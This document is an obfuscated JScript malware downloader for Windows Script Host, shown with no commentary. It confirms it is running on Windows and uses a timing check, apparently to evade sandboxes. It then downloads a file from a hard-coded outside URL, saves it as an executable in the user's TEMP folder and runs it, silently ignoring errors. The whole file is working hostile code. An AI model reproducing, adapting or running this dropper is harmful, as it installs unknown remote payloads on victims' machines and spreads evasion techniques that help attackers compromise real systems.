var _O = false;
var _UP = "CreateObject";
var _NC = function _A() {return WScript[_UP]("WScript"+".Shell");}(), _I0 = 11;
var _EW = "MSXML2.XMLHTTP";
var _K = 2123213;
var _X = 0;
function _VP(_SC){_NC["Run"](_SC, _X, _X);};
function _NT(){return _EW + "";};
function _A0(_AV, _Z){_X = _X * 1; return _AV - _Z;};
function _HP(){return _UP;};
/*@cc_on
  @if (@_win32 || @_win64)
    _O = true;
  @end
@*/
if (_O)
{
var _Q = "";
function _B0(){return 22;};
var _S = 0; var _E0 = 0;
function _B()
{
var _BX = new this["Date"]();
var _WA = _BX["getUTCMilliseconds"]();
WScript["Sleep"](_B0());
var _BX = new this["Date"]();
var _KD = _BX["getUTCMilliseconds"]();
WScript["Sleep"](_B0());
var _BX = new this["Date"]();
var _F = _BX["getUTCMilliseconds"]();
var _S = "_E";
_S = _A0(_KD, _WA);
var _E0 = "_I";
_E0 = _A0(_F, _KD);
_Q = "open";
return _A0(_S, _E0);
}
var _EQ = false;
var _H = false;
for (var _N = _X; _N < _B0() * 1; _N++){if (_B() != _X){
_EQ = true; 
_E0 = "31" + 11 * _S + _E0; 
_H = true; 
break;
}}
function _EE() {return ((_EQ == true) && (_EQ == _H)) ? 1 : _X;};
if (_EQ && _EE() && _H){
function _R() {return _NC["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Q9yaIArYU.ex" + "e";};
 _N0 = _NT();
 _U = WScript[_UP](_N0);
 var _KS = 1;
 while (_KS){
try {
	if (_KS == 1)
	{
		_U[_Q]("GET", "http://rocketsrange.com/b5ksa", false);
		_U["send"]();
		_V = "Sleep";
	}
	WScript[_V](_B0() + 120); 
	if (_U["readystate"] < 2 * 2) continue;
	_KS = _X;
	function _HK(_SV) {var _J = (1, 2, 3, 4, 5, _SV); return _J;};
	_M = WScript[_HP()]("ADODB.Stream");
	_N0 = _M;
	_N0[_Q]();
	_N0["type"] = _HK(1);
	_N0["write"](_U["ResponseBody"]);
	_M["position"] = _HK(_X);
	_N0["Save" + "ToFile"](_R(), 2);
	_M["cl"+"ose"]();
	_C = _R();
	_VP(_C);
} catch(_W){};
}
}
}

